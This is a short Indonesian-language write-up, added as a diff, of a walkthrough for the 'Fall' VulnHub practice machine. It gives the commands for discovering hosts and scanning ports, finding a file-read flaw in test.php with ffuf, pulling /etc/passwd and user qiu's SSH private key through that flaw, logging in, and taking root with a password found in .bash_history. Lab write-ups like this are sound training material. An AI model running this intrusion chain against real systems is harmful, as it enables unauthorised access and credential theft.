@@ -1,0 +1,27 @@
+Writeup Fall vulnhub
+
+1. Cek ip menggunakan command netdiscover :
+'netdiscover -i ens33 -r 192.168.0.0/24'
+dan ditemukan ip nya : 192.168.0.76
+
+2. Setelah itu saya cek port yang open menggunakn nmap :
+'nmap -A 192.168.0.76'
+dan ternyata ada banyak port yang terbuka.
+
+3. dan saya cek website nya dan ternyata ada cms. saya pun menggunakan gobuster untuk mencari sub directory yang mungkin vulnerability
+'gobuster dir -u http://192.168.0.76 -x php,txt,html -w /opt/wordlist/common.txt'
+saya cek 1 persatu
+
+4. Dan terdapat file test.php yang membutuhkan parameter jadi saya berpikir mungkin disini adalah letak vulnerabilitynya akhirnya saya pakai command ffuz
+' ./ffuf -r -c -ic -w /opt/wordlist/common.txt -u 'http://192.168.0.76/test.php?FUZZ=/etc/passwd' -fs 80'
+dan didapat paremeternya adalah file dan disini kita bisa baca file /etc/passwd-nya. 
+
+5. selanjutnya saya cek di semua user ada 1 user bernama qiu yang bisa menggunakan /bin/bash jadi saya coba mungkin terdapat private key ssh. dan ternyata ada saya pun mengambil file nya menggunakan wget .
+'wget http://192.168.0.76/test.php?file=/home/qiu/.ssh/id_rsa -o id_rsa'
+dan saya ubah permissionnya:
+'chmod 600 id_rsa'
+dan saya login dengan ssh
+'ssh qiu@192.168.0.76 -i id_rsa'
+
+6. dan berhasil login menggunankan user tersebut. selanjutnya saya cek file yang ada disini menggunakan command 'ls -la' dan ada .bash_history saya cek dan terdapat passwordnya qiu. akhirnya saya pakai command berikut untuk mendapat shell root
+'sudo su -l ' dan masukkan passwordnya. akhirnya saya berhasil masuk ke shell menggunakan hak akses root
